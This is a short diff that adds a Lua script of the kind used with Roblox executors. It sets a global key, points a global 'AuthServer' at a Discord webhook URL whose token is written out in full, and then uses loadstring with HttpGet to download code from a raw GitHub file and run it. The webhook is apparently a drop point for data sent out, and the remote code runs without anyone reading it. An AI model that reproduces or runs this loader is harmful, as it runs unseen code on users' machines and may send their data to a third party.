@@ -1,0 +1,3 @@
+_G.Key = "GNIMAGSKLATOSSUR"
+_G.AuthServer = "https://discord.com/api/webhooks/1054030879917355038/jatqf0AekHye2WrJvUYDQBkOuuX_743ptiN2yRM5ftdgeXDU4dIPRpbSkFbSBt7u_cU3"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/BlobV2"))()
